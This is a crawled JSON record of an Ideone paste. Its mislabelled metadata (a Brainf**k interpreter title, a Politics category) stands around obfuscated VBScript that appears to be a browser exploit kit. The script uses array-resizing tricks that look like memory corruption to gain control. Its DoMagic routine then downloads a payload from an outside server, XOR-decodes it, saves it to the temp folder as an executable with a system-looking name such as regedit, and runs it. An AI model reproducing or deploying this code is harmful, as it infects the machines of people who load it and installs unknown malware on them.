@@ -1,0 +1,74 @@
+{
+  "thread": {
+    "uuid": "c1c04c9dbf0bd991dc1a07cec8a9aaa85736d911",
+    "url": "https://ideone.com/B3VwJ2",
+    "site_full": "ideone.com",
+    "site": "ideone.com",
+    "site_section": "https://ideone.com/recent/1",
+    "site_categories": [
+      "paste"
+    ],
+    "section_title": "Recent codes - Ideone.com",
+    "title": "B3VwJ2 - Online Brainf**k Interpreter & Debugging Tool - Ideone.com",
+    "title_full": "B3VwJ2 - Online Brainf**k Interpreter & Debugging Tool - Ideone.com",
+    "published": "2024-06-06T20:32:00.000+03:00",
+    "replies_count": 0,
+    "participants_count": 0,
+    "site_type": "news",
+    "country": "VN",
+    "main_image": "http://profile.ak.fbcdn.net/hprofile-ak-prn1/50232_245768360841_3377786_q.jpg",
+    "performance_score": 0,
+    "domain_rank": 23344,
+    "domain_rank_updated": "2024-06-04T13:08:15.000+03:00",
+    "reach": null,
+    "social": {
+      "facebook": {
+        "likes": 0,
+        "comments": 0,
+        "shares": 0
+      },
+      "gplus": {
+        "shares": 0
+      },
+      "pinterest": {
+        "shares": 0
+      },
+      "linkedin": {
+        "shares": 0
+      },
+      "stumbledupon": {
+        "shares": 0
+      },
+      "vk": {
+        "shares": 0
+      }
+    }
+  },
+  "uuid": "c1c04c9dbf0bd991dc1a07cec8a9aaa85736d911",
+  "url": "https://ideone.com/B3VwJ2",
+  "ord_in_thread": 0,
+  "parent_url": null,
+  "author": null,
+  "published": "2024-06-06T20:32:00.000+03:00",
+  "title": "B3VwJ2 - Online Brainf**k Interpreter & Debugging Tool - Ideone.com",
+  "text": "Imports System Function fdg(s , k) Dim o Dim j Dim i o = \"\" j = 1 i = 1 For i = 1 To Len(s) o = o & Chr(Asc(Mid(s , i , 1)) Xor Asc(Mid(k , j , 1))) j = j + 1 If Len(k) < j Then j = 1 Next fdg = o End Function Function gfh(a) Dim cl1 , cl2 , cl3 , pl1 , pl2 , pl3 Dim l cl1 = 1 cl2 = 1 cl3 = 1 l = LenB(a) Do While cl1 < = l pl3 = pl3 & Chr(AscB(MidB(a , cl1 , 1))) cl1 = cl1 + 1 cl3 = cl3 + 1 If cl3 > 300 Then pl2 = pl2 & pl3 pl3 = \"\" cl3 = 1 cl2 = cl2 + 1 If cl2 > 200 Then pl1 = pl1 & pl2 pl2 = \"\" cl2 = 1 End If End If Loop gfh = pl1 & pl2 & pl3 End Function Function tra(intLength) Randomize Dim strS , intI , eqa eqa = Array(\"regedit\" , \"defsrag\" , \"dissdkchk\" , \"diskswtool\" , \"systemrestore\") strS = eqa(Int(Rnd() * UBound(eqa) + 1)) tra = strS End Function Sub DoMagic() On Error Resume Next Dim gds , jht , ytr gds = \"http://a ... content - available - to - author - only ... s . com/index . php?xHiMdbKdLxjHAos=l3SMfPrfJxzFGMSUb - nJDa9BMEXCRQLPh4SGhKrXCJ - ofSih17OIFxzsmTu2KV_OpqxveN0SZFSOzQfZPVQlyZAdChoB_Oqki0vHjUnH1cmQ9laH Y ghP7ceWRrQz2VjzmrEXdpkmkhPTvGQEyetLAV8QtAoQyvjJBKqKp0N6RgBnEB_CbJQlqw - fECT6PXl5gv2pHn4oieWN_PR - jp4k3Aygig\" jht = tra(7) & \" . exe\" jky = Array(\"Scripting . FileSystemObject\") Set erq = CreateObject(Join(jky , \"\")) vbw = erq . GetSpecialFolder(2) & \"\\\" bnm = vbw & jht uoo = Array(\"WinHttp . WinHttpRequest . 5 . 1\") Set rqq = CreateObject(Join(uoo , \"\")) rqq . open \"GET\" , gds , False rqq . setRequestHeader \"User - Agent\" , Navigator . UserAgent rqq . send If erq . FileExists(bnm) Then erq . DeleteFile(bnm) End If If rqq . Status = 200 Then Set ite = erq . CreateTextFile(bnm , True) ite . Write fdg(gfh(rqq . responseBody) , \"vwMKCwwA\") ite . Close End If If erq . FileExists(bnm) Then cmdline = bnm nbv = Array(\"WScript . Shell\") CreateObject(Join(nbv , \"\")) . Run cmdline CreateObject(Join(nbv , \"\")) . Run \"control . exe \" & cmdline End If End Sub Dim aa() Dim ab() Dim yui Dim a1 Dim a2 Dim a3 Dim rnda Dim funclass Dim nmd Begin() Function Begin() uyr() If Create() = True Then nms() End If End Function Function uyr() Randomize() ReDim aa(5) ReDim ab(5) yui = 13 + 17 * Rnd(6) a3 = 7 + 3 * Rnd(5) End Function Function Create() On Error Resume Next Dim i Create = False For i = 0 To 800 If mnl( & h8 ) = True Then Create = True Exit For End If Next End Function Sub testaa() End Sub Function typ() On Error Resume Next i = testaa i = Null ReDim Preserve aa(a2) ab(0) = 0 aa(a1) = i ab(0) = 6 . 36598737437801E - 314 nmd = chrw(01) & chrw(2176) nmd = nmd & chrw(01) nmd = nmd & chrw(00) & chrw(00) & chrw(00) & chrw(00) & chrw(00) nmd = nmd & chrw(00) nmd = nmd & chrw(32767) & chrw(00) & chrw(0) aa(a1 + 2) = nmd ab(2) = 0 . 174088534731324E - 309 typ = aa(a1) ReDim Preserve aa(yui) End Function Function nms() On Error Resume Next i = typ() i = rtv(i + 8) i = rtv(i + 16) j = rtv(i + & h134) For k = 0 To & h60 Step 4 j = rtv(i + & h120 + k) If(j = 14) Then j = 0 ReDim Preserve aa(a2) aa(a1 + 2)(i + & h11c + k) = ab(4) ReDim Preserve aa(yui) j = 0 j = rtv(i + & h120 + k) Exit For End If Next ab(2) = 1 . 69759663316747E - 313 DoMagic End Function Function mnl(addvl) On Error Resume Next Dim type1 , type2 , type3 mnl = False yui = yui + a3 a1 = yui + 2 a2 = yui + addvl ReDim Preserve aa(yui) ReDim ab(yui) If(IsObject(CreateObject)) Then ReDim Preserve aa(a2) End If type1 = 1 ab(0) = 1 . 123456789012345678901234567890 aa(yui) = 10 If(IsObject(aa(a1 - 1)) = False) Then If(VarType(aa(a1 - 1)) < > 0) Then If(IsObject(aa(a1)) = False) Then type1 = VarType(aa(a1)) End If End If End If If(type1 = & h2f66) Then mnl = True End If ReDim Preserve aa(yui) End Function Function rtv(add) On Error Resume Next ReDim Preserve aa(a2) ab(0) = 0 aa(a1) = add + 4 ab(0) = 0 . 169759663316747E - 312 rtv = LenB(aa(a1)) ab(0) = 0 ReDim Preserve aa(yui) End Function",
+  "highlightText": "",
+  "highlightTitle": "",
+  "highlightThreadTitle": "",
+  "language": "english",
+  "sentiment": "negative",
+  "categories": [
+    "Politics"
+  ],
+  "webz_reporter": false,
+  "external_links": [],
+  "external_images": [],
+  "entities": {
+    "persons": [],
+    "organizations": [],
+    "locations": []
+  },
+  "rating": null,
+  "crawled": "2024-06-07T01:54:44.291+03:00",
+  "updated": "2024-06-07T01:54:44.291+03:00"
+}
